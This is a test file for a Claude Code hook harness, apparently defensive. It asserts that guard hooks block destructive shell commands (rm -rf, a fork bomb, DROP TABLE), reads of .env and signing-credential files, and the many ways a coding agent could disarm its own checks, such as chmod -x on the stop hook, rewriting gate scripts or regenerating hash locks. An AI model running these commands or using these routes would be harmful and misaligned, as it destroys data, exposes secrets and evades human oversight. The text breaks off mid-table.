// Contract tests for the shipped Claude Code hooks: pipe hook-event JSON to
// stdin, assert exit codes and deny/block behavior. Hooks are tested from a
// rendered install layout (hooks import ../../tools/harness.config.mjs and
// ./lib/guard-rules.mjs).
//
// The bash/write guard deny/allow cases are TABLE-DRIVEN, keyed by the rule id
// exported from .claude/hooks/lib/guard-rules.mjs (RULE_CANARIES below). A meta-test
// imports that pure-data module and asserts every rule id has at least one canary —
// the per-rule falsifiability closure scripts/check-canary-coverage.mjs greps for.
// Path-scoped inline checks (app.config weakenings, WITH RECURSIVE, the mobile
// server-import ban, the expo-secure-store host seam, the web getSession/service-role
// checks, append-only migrations) have no flat rule id and stay as direct tests.

import assert from 'node:assert/strict'
import { spawnSync } from 'node:child_process'
import { cpSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { before, test } from 'node:test'
import { fileURLToPath } from 'node:url'

const TEMPLATE = fileURLToPath(new URL('../../template/base/', import.meta.url))
const GUARD_RULES = new URL(
  '../../template/base/.claude/hooks/lib/guard-rules.mjs',
  import.meta.url,
)
let proj

before(() => {
  proj = mkdtempSync(join(tmpdir(), 'epah-hooks-'))
  cpSync(join(TEMPLATE, '.claude'), join(proj, '.claude'), { recursive: true })
  mkdirSync(join(proj, 'tools'), { recursive: true })
  // posttool-source-check imports the shared heuristic from ../../tools/lib/ —
  // part of the rendered install layout, like harness.config.mjs above.
  cpSync(join(TEMPLATE, 'tools/lib'), join(proj, 'tools/lib'), { recursive: true })
  // The MCP guard reads the approved-tools registry out of the install root.
  cpSync(join(TEMPLATE, 'tools/approved-tools.json'), join(proj, 'tools/approved-tools.json'))
  mkdirSync(join(proj, 'supabase/migrations'), { recursive: true })
  writeFileSync(join(proj, 'supabase/migrations/0000_init.sql'), '-- existing migration\n')
})

/**
 * The ambient environment a hook must NOT inherit from whoever ran the tests.
 *
 * HARNESS_ALLOW_SELF_EDIT=1 is the documented human escape hatch: every write rule honours
 * it and returns no deny. It is also how you work ON this repository — editing the
 * enforcement surface requires it exported — so a maintainer running the suite had it set,
 * and `{ ...process.env }` handed it to all 138 deny cases. They did not fail; they
 * PASSED THROUGH, asserting nothing, and the suite reported 138 reds that read as
 * environmental noise. Worse than either: it checks LESS locally than in CI, so the first
 * honest run is the one on the PR.
 *
 * Deleted, not set to '' — the guards test for the literal '1', but an inherited variable
 * is the kind of thing a later check might merely test for PRESENCE of. Same reasoning, and
 * the same defect, as scripts/ci/upgrade-lane.sh's script-wide unset.
 *
 * Per-case `env` is applied AFTER, so the cases that deliberately exercise the hatch
 * (SELF_EDIT) still get it — the escape stays proven, it just stops being ambient.
 */
const LEAKY = ['HARNESS_ALLOW_SELF_EDIT', 'HARNESS_REQUIRE_TOOLCHAINS', 'GITHUB_BASE_REF', 'CI']
function cleanEnv() {
  const e = { ...process.env }
  for (const k of LEAKY) delete e[k]
  return e
}

function runHook(name, input, { env = {}, cwd = proj } = {}) {
  const res = spawnSync('node', [join(proj, '.claude/hooks', name)], {
    input: typeof input === 'string' ? input : JSON.stringify(input),
    encoding: 'utf8',
    cwd,
    env: { ...cleanEnv(), CLAUDE_PROJECT_DIR: proj, ...env },
  })
  return { code: res.status, stdout: res.stdout ?? '', stderr: res.stderr ?? '' }
}

const denied = (r) => r.stdout.includes('"deny"') || r.code === 2

// Windows runners may lack the symlink privilege (no Developer Mode): these
// tests SKIP there rather than fail — every other spelling is still covered.
function trySymlink(target, path) {
  try {
    symlinkSync(target, path)
    return true
  } catch (err) {
    if (process.platform === 'win32' && (err.code === 'EPERM' || err.code === 'EACCES')) {
      return false
    }
    throw err
  }
}

// ── fail-closed I/O contract ─────────────────────────────────────────────────
test('guards fail CLOSED on malformed (non-JSON) stdin', () => {
  for (const hook of ['pretool-bash-guard.mjs', 'pretool-write-guard.mjs']) {
    const r = runHook(hook, 'this is { not json')
    assert.equal(r.code, 2, `${hook} must exit 2 on malformed stdin, got ${r.code}`)
    assert.match(r.stderr, /HOOK CRASHED|failing closed/i)
  }
})

test('guards pass on EMPTY stdin (legitimate no-input events)', () => {
  const r = runHook('pretool-bash-guard.mjs', '')
  assert.equal(r.code, 0)
})

test('guards fail CLOSED when guard-rules.mjs cannot load (removed module)', () => {
  const broken = mkdtempSync(join(tmpdir(), 'epah-hooks-broken-'))
  cpSync(join(TEMPLATE, '.claude'), join(broken, '.claude'), { recursive: true })
  // Delete the rule tables the guards depend on: a guard that cannot read its
  // rules must BLOCK (exit 2), never approve.
  rmSync(join(broken, '.claude/hooks/lib/guard-rules.mjs'))
  for (const hook of ['pretool-bash-guard.mjs', 'pretool-write-guard.mjs']) {
    const res = spawnSync('node', [join(broken, '.claude/hooks', hook)], {
      input: JSON.stringify({
        tool_input: { command: 'echo hi', file_path: 'x.ts', content: 'x' },
      }),
      encoding: 'utf8',
      // Sanitized for the same reason runHook is: the escape hatch must not be able to
      // turn "cannot read my rules" into an approval by accident of who ran the tests.
      env: { ...cleanEnv(), CLAUDE_PROJECT_DIR: broken },
    })
    assert.equal(res.status, 2, `${hook} must fail closed when guard-rules is missing`)
    assert.match(res.stderr ?? '', /guard-rules|failing closed/i)
  }
})

// ── table-driven guard canaries (keyed by guard-rules rule id) ────────────────
// Every id exported from guard-rules.mjs must appear here (asserted by the meta-test
// below and by scripts/check-canary-coverage.mjs).
const bashDeny = (command) => ({
  hook: 'pretool-bash-guard.mjs',
  input: { tool_name: 'Bash', tool_input: { command } },
  expectDeny: true,
})
const bashAllow = (command, env) => ({
  hook: 'pretool-bash-guard.mjs',
  input: { tool_name: 'Bash', tool_input: { command } },
  expectDeny: false,
  env,
})
const pathDeny = (file_path) => ({
  hook: 'pretool-write-guard.mjs',
  input: { tool_input: { file_path, content: 'x\n' } },
  expectDeny: true,
})
const pathAllow = (file_path, env) => ({
  hook: 'pretool-write-guard.mjs',
  input: { tool_input: { file_path, content: 'x\n' } },
  expectDeny: false,
  env,
})
const contentDeny = (file_path, content) => ({
  hook: 'pretool-write-guard.mjs',
  input: { tool_input: { file_path, content } },
  expectDeny: true,
})
const contentAllow = (file_path, content) => ({
  hook: 'pretool-write-guard.mjs',
  input: { tool_input: { file_path, content } },
  expectDeny: false,
})

const SELF_EDIT = { HARNESS_ALLOW_SELF_EDIT: '1' }

// ── MCP-guard fixture ─────────────────────────────────────────────────────────
// The readOnly rule is only REACHABLE on a server whose tools list admits the call, so
// the shipped registry (two servers, closed tool lists) cannot exercise it: the tool
// allowlist would deny first and the canary would prove the wrong thing. This fixture
// registers a wildcard readOnly server, which is the honest spelling for a large
// first-party server and exactly the configuration where shape-based denial is the only
// thing standing between a read grant and `apply_migration`.
const MCP_FIXTURE = mkdtempSync(join(tmpdir(), 'epah-mcp-'))
mkdirSync(join(MCP_FIXTURE, 'tools'), { recursive: true })
writeFileSync(
  join(MCP_FIXTURE, 'tools/approved-tools.json'),
  `${JSON.stringify(
    {
      servers: [
        { server: 'wide', version: 'x', readOnly: true, reason: 'fixture', tools: ['*'] },
        { server: 'writable', version: 'x', readOnly: false, reason: 'fixture', tools: ['*'] },
      ],
    },
    null,
    2,
  )}\n`,
)
const MCP_ENV = { CLAUDE_PROJECT_DIR: MCP_FIXTURE }
const mcpDeny = (tool_name, env = MCP_ENV) => ({
  hook: 'pretool-mcp-guard.mjs',
  input: { tool_name, tool_input: {} },
  expectDeny: true,
  env,
})
const mcpAllow = (tool_name, env = MCP_ENV) => ({
  hook: 'pretool-mcp-guard.mjs',
  input: { tool_name, tool_input: {} },
  expectDeny: false,
  env,
})

const RULE_CANARIES = {
  // ── bash-guard ──
  'rm-rf': [
    bashDeny('rm -rf node_modules'),
    // The old single-token regex missed every one of these spellings.
    bashDeny('rm -fr build'),
    bashDeny('rm -Rf build'),
    bashDeny('rm -rF build'),
    bashDeny('rm -r -f build'),
    bashDeny('rm -f -R build'),
    bashDeny('rm --recursive --force build'),
    bashDeny('rm --force --recursive build'),
    bashDeny('rm -v -rf build'),
    // POWERSHELL (0.6.0). `rm -Recurse -Force` was already denied — PowerShell's long flag
    // names are just longer spellings of the same letter classes, verified rather than
    // assumed — so the gap was only ever the CANONICAL verb and its non-bash aliases, which
    // share no token with `rm`. This matters most where it is least visible: on Windows
    // without Git Bash, Claude Code registers no Bash tool at all, so PowerShell is the only
    // shell those sessions have.
    bashDeny('Remove-Item -Recurse -Force build'),
    bashDeny('Remove-Item -Path build -Recurse -Force'),
    bashDeny('remove-item -recurse -force build'),
    bashDeny('del -Recurse -Force build'),
    bashDeny('rd -Recurse -Force build'),
  ],
  'shell-write-protected': [
    // Shell writes into the enforcement surface bypass the write-guard — denied.
    bashDeny('echo "export const VALIDATE_STEPS = []" > tools/harness.config.mjs'),
    bashDeny('echo deadbeef > .harness/build.ok'),
    bashDeny('cat payload.mjs >> tools/validate.mjs'),
    bashDeny('echo x | tee tools/check-sources.mjs'),
    bashDeny('echo x | tee -a .claude/hooks/stop-validate-gate.mjs'),
    bashDeny('sed -i "s/exit 1/exit 0/" tools/check-migrations.mjs'),
    bashDeny('perl -i -pe "s/deny/pass/" .claude/hooks/pretool-bash-guard.mjs'),
    bashDeny('cp /tmp/evil.mjs tools/validate.mjs'),
    bashDeny('mv patched.yml .github/workflows/quality-gate.yml'),
    // The canonical PowerShell writers (0.6.0). `>`/`>>` redirect in PowerShell too and its
    // `cp`/`mv`/`tee` aliases already matched, so the gap was the cmdlet spelling alone.
    bashDeny('Set-Content -Path tools/validate.mjs -Value "process.exit(0)"'),
    bashDeny('Out-File -FilePath .harness/build.ok'),
    bashDeny('Copy-Item C:\\tmp\\evil.mjs tools/validate.mjs'),
    // Patch application reconstructs arbitrary bytes at a protected path with no
    // redirect operator to match on.
    bashDeny('git apply /tmp/weaken-gate.patch tools/check-expo-policy.mjs'),
    bashDeny('echo "-- tweak" >> supabase/migrations/0000_init.sql'),
    bashDeny('echo {} > pnpm-lock.yaml'),
    bashDeny('echo "" > eslint.config.mjs'),
    // The mobile jest config is the other half of the unit floor.
    bashDeny('echo {} > apps/mobile/jest.config.js'),
    // The generated native dirs ride along on the shell-write surface (CNG purity).
    bashDeny('echo x > apps/mobile/android/local.properties'),
    bashDeny('echo x >> apps/mobile/ios/Podfile'),
    // Windows spellings — the protected-surface patterns accept both separators.
    bashDeny('echo x > tools\\validate.mjs'),
    bashDeny('echo x | tee .claude\\hooks\\stop-validate-gate.mjs'),
    bashDeny('echo deadbeef > .harness\\build.ok'),
    bashDeny('cp evil.yml .github\\workflows\\quality-gate.yml'),
    bashDeny('echo x > apps\\mobile\\android\\build.gradle'),
    // tsconfig(.base).json carries the max-strict compiler surface every type gate rests
    // on. It was write-guard-protected but ABSENT from the shell-write surface, so this
    // exact command weakened strictness with nothing to catch it — not this guard, not
    // gate-integrity, not `tsc -b`, not CI.
    bashDeny('sed -i \'s/"strict": true/"strict": false/\' tsconfig.base.json'),
    bashDeny('echo {} > tsconfig.json'),
    // The installed commit-time layer (0.9.0): every one of these disarmed lefthook with
    // a green chain before .git/hooks and .git/config joined the shell-write surface.
    bashDeny('echo "exit 0" > .git/hooks/pre-commit'),
    bashDeny('cp /tmp/empty-hook .git/hooks/pre-commit'),
    bashDeny('echo x | tee .git/hooks/pre-push'),
    bashDeny('sed -i "s/hooksPath.*//" .git/config'),
    bashDeny('echo "[core]" > .git/config'),
    bashDeny('Set-Content -Path .git/config -Value "[core]"'),
    bashDeny('echo x > .git\\hooks\\pre-commit'),
    // Honors the HARNESS_ALLOW_SELF_EDIT=1 human escape hatch (canary CI uses it).
    bashAllow('echo x > tools/canary-probe.mjs', SELF_EDIT),
  ],
  'interpreter-write-protected': [
    // An inline interpreter is a write primitive: it lands the same bytes as `>` while
    // matching none of the redirect spellings above. This was the one un-denied way to
    // widen a security escape list, doctor a gate script, or forge a stamp.
    bashDeny(`node -e "require('fs').appendFileSync('tools/rls-exempt.json', '{}')"`),
    bashDeny(`node --eval "require('fs').writeFileSync('tools/validate.mjs','')"`),
    bashDeny(`python3 -c "open('tools/check-sources.mjs','w').write('')"`),
    bashDeny(`ruby -e "File.write('.claude/hooks/stop-validate-gate.mjs','')"`),
    bashDeny(`deno eval "Deno.writeTextFileSync('tools/validate.floor.json','[]')"`),
    // The interpreter spelling of the .git disarm (0.9.0) — no redirect, same bytes.
    bashDeny(`node -e "require('fs').writeFileSync('.git/hooks/pre-commit','')"`),
    bashDeny('dd if=/dev/zero of=.harness/build.ok'),
    bashDeny('base64 -d payload.b64 > tools/harness.config.mjs'),
    // Interpreters are the agent's normal working tools — only a write to the PROTECTED
    // surface is denied. A guard that blocked `node -e` outright would be unusable.
    bashAllow('node -e "console.log(1 + 1)"'),
    bashAllow(`node -e "require('fs').writeFileSync('src/app.ts','x')"`),
    bashAllow('node tools/validate.mjs'),
    bashAllow('python3 scripts/report.py'),
    // Human-in-the-loop escape hatch, same as every other tamper rule.
    bashAllow(`node -e "require('fs').writeFileSync('tools/validate.mjs','x')"`, SELF_EDIT),
  ],
  // Regenerating a hash lock launders an edit to the files it protects. Denied by
  // NAME SHAPE, so a lock generator added later is covered the day it appears; the
  // human escape is the same HARNESS_ALLOW_SELF_EDIT=1 every other rule honours.
  'gen-lock-writer': [
    bashDeny('node tools/gen-agents-lock.mjs --write'),
    bashDeny('pnpm exec node tools/gen-agents-lock.mjs --write'),
    bashDeny('node tools/gen-prompts-lock.mjs --write'),
    // Reading what the lock WOULD say is fine — only writing it is the laundering act.
    bashAllow('node tools/gen-agents-lock.mjs --check'),
    bashAllow('node tools/gen-agents-lock.mjs'),
    bashAllow('node tools/gen-agents-lock.mjs --write', SELF_EDIT),
  ],
  // ── the DISARM verbs (0.3.0): neutralize the surface without writing to it ──
  // Every one of these was ALLOWED before 0.3.0, and not one of them lands a byte on the
  // path it targets, which is exactly why the redirect/tee/sed/cp/interpreter rules all
  // missed them.
  'chmod-protected': [
    // THE governing-proof case: `chmod -x` on the Stop hook used to silently disarm the
    // turn gate while every sha256 in the manifest still matched.
    bashDeny('chmod -x .claude/hooks/stop-validate-gate.mjs'),
    bashDeny('chmod 000 tools/validate.mjs'),
    bashDeny('chmod -R a-x .claude/hooks'),
    bashAllow('chmod +x scripts/deploy.sh'),
    bashAllow('chmod -x .claude/hooks/stop-validate-gate.mjs', SELF_EDIT),
  ],
  'rm-protected': [
    bashDeny('rm tools/check-tenancy.mjs'),
    bashDeny('rm .harness/manifest.json'),
    bashDeny('rm .github/workflows/quality-gate.yml'),
    bashDeny('rm -f tools/rls-exempt.json'),
    // Deleting the installed pre-commit hook is the quietest disarm of layer 2 (0.9.0).
    bashDeny('rm .git/hooks/pre-commit'),
    // Ordinary cleanup is untouched (and `rm -rf` has its own, earlier rule).
    bashAllow('rm stale.log'),
    bashAllow('rm -f build/out.js'),
    bashAllow('rm tools/check-tenancy.mjs', SELF_EDIT),
  ],
  'truncate-protected': [
    bashDeny('truncate -s 0 tools/rls-exempt.json'),
    bashDeny('truncate --size 0 .claude/hooks/pretool-write-guard.mjs'),
    bashAllow('truncate -s 0 logs/app.log'),
    bashAllow('truncate -s 0 tools/rls-exempt.json', SELF_EDIT),
  ],
  'move-protected-away': [
    bashDeny('mv tools/check-migrations.mjs /tmp/parked.mjs'),
    bashDeny('mv .claude/hooks/stop-validate-gate.mjs .claude/hooks/stop-validate-gate.mjs.bak'),
    // Reading FROM the surface stays allowed — only relocation removes the file.
    bashAllow('cp tools/check-migrations.mjs /tmp/inspect.mjs'),
    bashAllow('mv draft.md docs/notes.md'),
    bashAllow('mv tools/check-migrations.mjs /tmp/parked.mjs', SELF_EDIT),
  ],
  'git-restore-old-revision': [
    bashDeny('git checkout HEAD~5 -- tools/check-rls-manifest.mjs'),
    bashDeny('git checkout v0.1.0 -- tools/validate.floor.json'),
    bashDeny('git restore --source=HEAD~3 tools/harness.config.mjs'),
    bashDeny('git restore -s v0.1.0 .claude/hooks/pretool-write-guard.mjs'),
    // The REMEDY a dozen gate messages prescribe — restoring the CURRENT committed
    // content — must stay allowed, or the guard teaches people to reach for the escape.
    bashAllow('git checkout -- tools/check-rls-manifest.mjs'),
    bashAllow('git restore tools/harness.config.mjs'),
    bashAllow('git checkout HEAD~5 -- src/app.ts'),
    bashAllow('git checkout HEAD~5 -- tools/check-rls-manifest.mjs', SELF_EDIT),
  ],
  'self-rebaseline-writer': [
    // The sibling of gen-lock-writer: not a write to the surface, just one subprocess
    // that turns the regression the ratchet caught into the new normal.
    bashDeny('node tools/check-mutation-ratchet.mjs --write'),
    bashDeny('node tools/perf-baseline.mjs'),
    bashDeny('pnpm perf:baseline'),
    // READING the ratchet's verdict is the whole point of the ratchet.
    bashAllow('node tools/check-mutation-ratchet.mjs'),
    // `pnpm gen`'s inventory generators are regen-DIFFED by the contracts gate, so
    // re-running one is checked, not accepted.
    bashAllow('node tools/gen-action-inventory.mjs'),
    bashAllow('node tools/check-mutation-ratchet.mjs --write', SELF_EDIT),
  ],
  'git-hookspath-repoint': [
    bashDeny('git config core.hooksPath /tmp/nohooks'),
    bashDeny('git -c core.hooksPath=/dev/null commit -m x'),
  ],
  'dev-auth-access': [
    bashDeny('cat .dev-auth/jwks.json'),
    bashDeny('ls .dev-auth/'),
    bashDeny('cp .dev-auth/token.txt /tmp/t'),
  ],
  'git-force-push': [bashDeny('git push --force origin main')],
  'git-reset-hard': [bashDeny('git reset --hard HEAD~1')],
  'git-commit-no-verify': [bashDeny('git commit --no-verify -m "skip hooks"')],
  'fork-bomb': [bashDeny(':(){ :|:& };:')],
  'read-env-file': [
    bashDeny('cat .env.local'),
    bashDeny('sed -n 1p .env.local'),
    bashDeny('base64 .env'),
    // The canonical PowerShell readers (0.6.0). Its bash-compatible aliases (`cat`, `more`)
    // already matched; `Get-Content` and `Select-String` share no token with them.
    bashDeny('Get-Content .env.local'),
    bashDeny('Select-String SUPABASE .env'),
  ],
  'source-env-file': [bashDeny('source .env'), bashDeny('. ./.env')],
  'credential-file-read': [
    // App-signing and store-credential material never transits the shell.
    bashDeny('cat android/app/release.keystore'),
    bashDeny('cp upload-key.jks /tmp/'),
    bashDeny('cat AuthKey_ABC123.p8'),
    bashDeny('base64 dist-cert.p12'),
    bashDeny('cat apps/mobile/google-services.json'),
    bashDeny('grep client_id GoogleService-Info.plist'),
    bashDeny('Get-Content AuthKey_ABC123.p8'),
    bashDeny('Copy-Item upload-key.jks C:\\temp\\'),
    // Docs ABOUT credential files are not credential files.
    bashAllow('cat docs/google-services-setup.md'),
  ],
  'expo-token-leak': [
    bashDeny('EXPO_TOKEN=abc123 eas build --platform ios'),
    bashDeny('echo $EXPO_TOKEN'),
    bashDeny('printenv EXPO_TOKEN'),
    bashDeny('grep -r EXPO_TOKEN .github/'),
    // The CI invocation itself (token injected from secrets, never spelled) passes.
    bashAllow('eas build --platform ios --non-interactive'),
  ],
  'eas-credentials': [
    bashDeny('eas credentials'),
    bashDeny('eas credentials --platform android'),
    bashAllow('eas build --profile preview'),
  ],
  'expo-prebuild': [
    bashDeny('npx expo prebuild'),
    bashDeny('pnpm exec expo prebuild --clean'),
    bashAllow('npx expo start'),
  ],
  'git-add-native-dirs': [
    bashDeny('git add apps/mobile/android'),
    bashDeny('git add apps/mobile/ios/Podfile'),
    bashDeny('git add android'),
    bashDeny('git add ios/'),
    bashDeny('git add ./android'),
    bashDeny('git add -f android/app'),
    // Windows spelling.
    bashDeny('git add apps\\mobile\\android'),
    // Ordinary mobile source and docs that merely CONTAIN "ios"/"android" pass.
    bashAllow('git add apps/mobile/src/App.tsx'),
    bashAllow('git add docs/ios-notes.md'),
  ],
  'knip-fix': [bashDeny('pnpm exec knip --fix')],
  'dependency-update': [bashDeny('pnpm update'), bashDeny('pnpm update --latest')],
  'destructive-sql': [
    bashDeny('psql "$DATABASE_URL" -c "DROP TABLE notes"'),
    bashDeny('psql "$DATABASE_URL" -c "DROP SCHEMA public CASCADE"'),
  ],

  // ── write-guard: harness-protected paths ──
  'harness-config': [
    pathDeny('tools/harness.config.mjs'),
    pathAllow('tools/harness.config.mjs', SELF_EDIT),
  ],
  'validate-runner': [pathDeny('tools/validate.mjs')],
  // The frozen CI floor — protected like validate.mjs, escapable under self-edit.
  'validate-floor': [
    pathDeny('tools/validate.floor.json'),
    pathAllow('tools/validate.floor.json', SELF_EDIT),
  ],
  'gate-scripts': [
    pathDeny('tools/check-expo-policy.mjs'),
    pathDeny('tools/check-native-deps.mjs'),
    pathDeny('tools/build-check.mjs'),
    pathDeny('tools/perf-baseline.mjs'),
  ],
  // Listed before tools-lib in WRITE_PROTECTED so the citation allowlist carries
  // its own named deny; the SELF_EDIT escape stays human-only, like every rule.
  'citation-domains': [
    pathDeny('tools/lib/citation-domains.mjs'),
    pathAllow('tools/lib/citation-domains.mjs', SELF_EDIT),
  ],
  'tools-lib': [pathDeny('tools/lib/gate.mjs')],
  'tools-mcp': [pathDeny('tools/mcp/corpus-search-server.mjs')],
  'lock-json': [pathDeny('tools/identity.lock.json'), pathDeny('tools/prompts.lock.json')],
  'rls-exempt': [pathDeny('tools/rls-exempt.json')],
  // The tenancy contract: predicateForms IS the definition of a correct tenant
  // predicate, so an agent that could append to it could legalize its own broken
  // policy in the same turn it wrote the policy.
  'tenancy-contract': [pathDeny('tools/tenancy.json')],
  // Allowlisting a definer function now AUTHORIZES EXECUTE-to-authenticated on it
  // (0.2.0), so this file hands out privilege-escalation reach.
  'security-definer-allow': [pathDeny('tools/security-definer-allow.json')],
  // One authorizes value capture into the trail, the other refuses it — an agent that
  // could edit either could approve copying the column it was about to leak.
  'audit-columns': [pathDeny('tools/audit-columns.json')],
  'pii-columns': [pathDeny('tools/pii-columns.json')],
  // Raising a ceiling here makes a widened statement_timeout pass as reviewed.
  'db-limits': [pathDeny('tools/db-limits.json')],
  'data-flow': [pathDeny('tools/data-flow.json')],
  // 0.8.0. A sinks[] row licenses a telemetry egress path; a narrowed detector unsees one.
  'observability-sinks': [pathDeny('tools/observability.json')],
  'reviewer-triggers': [pathDeny('tools/reviewer-triggers.json')],
  'rate-limit-budget': [pathDeny('tools/rate-limit-budget.json')],
  // 0.5.0. The reviewed side of the `security-headers` by-value diff: the gate evaluates
  // apps/web/lib/security-headers.ts and diffs what it RETURNS against this file, so an
  // agent that could edit it could delete a CSP directive from the expectation and make
  // the code side agree. It sat in ESCAPE_LISTS and SEEDED_FILES with no rule here from
  // 0.2.0 until scripts/check-escape-registry.mjs compared the lists.
  'security-headers-policy': [
    pathDeny('tools/security-headers.json'),
    pathAllow('tools/security-headers.md'),
  ],
  // 0.5.0, tolerated-absent (grounded in check-canary-coverage.mjs#GROUNDED_ELSEWHERE):
  // CREATING this file is the widening, because it exempts a (file, rule) pair from the
  // append-only migration rule.
  'migrations-allow': [
    pathDeny('tools/migrations-allow.json'),
    pathAllow('docs/runbooks/expand-contract.md'),
  ],
  // 0.5.0, and the only harness-OWNED file in this block. Lowering one `minPatchByMajor`
  // turns a `version-sync` red naming four HIGH CVEs into a green, and the diff reads
  // like an ordinary version edit — which is why the deny has to land before the write,
  // not only as a step-2 hash mismatch afterwards.
  'framework-floor': [
    pathDeny('tools/framework-floor.json'),
    pathAllow('docs/harness/gates-catalog.md'),
  ],
  // The floor on the tool the harness RUNS INSIDE (0.6.0). The dangerous edit is not lowering
  // the scalar — version-sync reds on that — it is deleting an advisory row, because the
  // floor is DERIVED from the rows and falls silently with them.
  'cc-floor': [pathDeny('tools/cc-floor.json'), pathAllow('tools/framework-floor.example.json')],
  // `minRows` in here is the anti-vacuity floor for the plan probe: lower it and
  // db-perf certifies a plan against a table small enough that every structural
  // check is already green, while still printing OK.
  'db-perf-baseline': [pathDeny('tools/db-perf-baseline.json')],
  // Generated, and hand-editable by nobody: it is the record of what the DALs
  // actually asked the database for, and `query-shapes` judges index service
  // against it. `pnpm gen` is the only author.
  'query-shapes-manifest': [pathDeny('tools/generated/query-shapes.json')],
  'action-inventory-manifest': [pathDeny('tools/generated/action-inventory.json')],
  // The agent surface: the prose the coding agent runs under. Layer 3 (prevention) did
  // not exist for any of these before 0.2.0 — an agent could rewrite its own reviewers,
  // rules, commands and skills, and only the hash lock would notice.
  'claude-rules': [pathDeny('.claude/rules/security-invariants.md')],
  'claude-agents': [pathDeny('.claude/agents/security-reviewer.md')],
  'claude-commands': [pathDeny('.claude/commands/new-feature.md')],
  'claude-skills': [pathDeny('.claude/skills/authoring-vertical-slice/SKILL.md')],
  // The hash OF that surface: regenerating it is how an edit to it becomes invisible.
  'agents-lock': [pathDeny('tools/agents.lock.json')],
  'provenance-overrides': [pathDeny('tools/provenance-overrides.json')],
  'decision-groups': [pathDeny('tools/decision-groups.json')],
  'license-exceptions': [pathDeny('tools/license-exceptions.json')],
  // Reviewed platform-capability data: widening a permission or config-plugin
  // allowlist is native reach — a human decision.
  'expo-permissions': [pathDeny('tools/expo-permissions.json')],
  'expo-plugins': [pathDeny('tools/expo-plugins.json')],
  'store-policy': [pathDeny('tools/store-policy.json')],
  'bundle-budget': [pathDeny('tools/bundle-budget.json')],
  // The gzip-ratchet baseline: agent-editing it would re-baseline the agent's
  // own regression; `pnpm perf:baseline` + a reviewed commit is the only path.
  'perf-baseline': [pathDeny('tools/perf-baseline.json')],
  'perf-budget': [pathDeny('tools/perf-budget.json')],
  // The CI perf lane's wall-clock budgets: an agent raising them would
  // re-baseline its own interaction-latency regression.
  'interaction-budget': [pathDeny('tools/interaction-budget.json')],
  // Cold-start / fully-drawn / per-screen budgets for the device perf lane —
  // raising a cap re-baselines the regression the lane just caught.
  'startup-budget': [pathDeny('tools/startup-budget.json')],
  'styleguide-manifest': [pathDeny('tools/styleguide.manifest.json')],
  'mutation-baseline': [pathDeny('tools/mutation-baseline.json')],
  'route-allowlist': [pathDeny('tools/route-allowlist.json')],
  'web-route-allowlist': [pathDeny('tools/web-route-allowlist.json')],
  'dto-bounds-allow': [pathDeny('tools/dto-bounds-allow.json')],
  'duplication-allow': [pathDeny('tools/duplication-allow.json')],
  'i18n-allow': [pathDeny('tools/i18n-allow.json')],
  'test-quality-allow': [pathDeny('tools/test-quality-allow.json')],
  'rls-runner': [pathDeny('tests/rls/run-rls.mjs')],
  lefthook: [pathDeny('lefthook.yml')],
  // 0.9.0: the INSTALLED commit-time layer. Overwriting .git/hooks/pre-commit disarmed
  // layer 2 with a green chain — the hookspath rule only ever saw the REPOINT spelling.
  'git-hooks-dir': [
    pathDeny('.git/hooks/pre-commit'),
    pathDeny('.git/hooks/pre-push'),
    // A similarly-named path that is NOT the live hooks dir stays ordinary work.
    pathAllow('.githooks/pre-commit'),
    pathAllow('.git/hooks/pre-commit', SELF_EDIT),
  ],
  // 0.9.0: where core.hooksPath actually lives. Only WRITES by path are denied — reading
  // the file, and `git config` through the git CLI (no path token), stay legal.
  'git-config': [
    pathDeny('.git/config'),
    bashAllow('cat .git/config'),
    bashAllow('git config user.email dev@example.com'),
    pathAllow('.git/config', SELF_EDIT),
  ],
  'github-workflows': [pathDeny('.github/workflows/quality-gate.yml')],
  'eslint-config': [pathDeny('eslint.config.mjs')],
  'biome-config': [pathDeny('biome.jsonc')],
  'knip-config': [pathDeny('knip.json')],
  'dependency-cruiser': [pathDeny('.dependency-cruiser.cjs')],
  'vitest-config': [pathDeny('vitest.config.ts')],
  // The other half of the unit floor: the jest-expo preset config the Stop
  // hook's mobile-unit step runs.
  'jest-config': [pathDeny('apps/mobile/jest.config.js')],
  tsconfig: [pathDeny('tsconfig.json'), pathDeny('tsconfig.base.json')],
  'pnpm-workspace': [pathDeny('pnpm-workspace.yaml')],
  'gitleaks-config': [pathDeny('.gitleaks.toml')],
  'claude-settings': [pathDeny('.claude/settings.json')],
  'claude-settings-local': [pathDeny('.claude/settings.local.json')],
  'mcp-json': [pathDeny('.mcp.json')],
  'harness-dir': [pathDeny('.harness/manifest.json')],
  // CNG purity: the generated native dirs are never hand-edited — native surface
  // changes go through app.config.ts + reviewed config plugins.
  'cng-android': [
    pathDeny('apps/mobile/android/app/build.gradle'),
    pathDeny('apps/mobile/android/gradle.properties'),
  ],
  'cng-ios': [pathDeny('apps/mobile/ios/Podfile'), pathDeny('apps/mobile/ios/App/Info.plist')],

  // ── write-guard: the 0.3.0 closure over the high-leverage unprotected files ──
  // Every path below was agent-writable on 0.2.1. Each carries its deny plus an ALLOW
  // TWIN: a rule that denies a whole directory an agent legitimately works in is a rule
  // that gets escaped, so the twin is where the scope is actually pinned down.
  'codeowners': [
    // The compensating control ~ten gate failure messages cite by name.
    pathDeny('.github/CODEOWNERS'),
    pathAllow('docs/CODEOWNERS-guide.md'),
    pathAllow('.github/CODEOWNERS', SELF_EDIT),
  ],
  'actionlint-config': [pathDeny('.github/actionlint.yaml'), pathAllow('.github/dependabot.yml')],
  'zizmor-config': [pathDeny('.github/zizmor.yml'), pathAllow('.github/ISSUE_TEMPLATE/bug.yml')],
  'pr-template': [
    pathDeny('.github/pull_request_template.md'),
    pathAllow('.github/ISSUE_TEMPLATE/feature.md'),
  ],
  'gitignore': [
    // One appended line here makes a file invisible to `git status`, which is what the
    // escape-list dirty check, the diff-coverage change set and the append-only
    // migration diff all read.
    pathDeny('.gitignore'),
    pathAllow('apps/mobile/.gitignore-notes.md'),
    pathAllow('.gitignore', SELF_EDIT),
  ],
  'renovate-config': [pathDeny('renovate.json'), pathAllow('docs/renovate-policy.md')],
  'stryker-config': [pathDeny('stryker.config.mjs'), pathAllow('apps/web/next.config.ts')],
  'commitlint-config': [pathDeny('commitlint.config.mjs'), pathAllow('apps/web/postcss.config.mjs')],
  'tools-ci': [
    pathDeny('tools/ci/device-lane.sh'),
    pathDeny('tools/ci/perf-lane.sh'),
    pathAllow('scripts/local-smoke.sh'),
  ],
  'claude-hooks': [
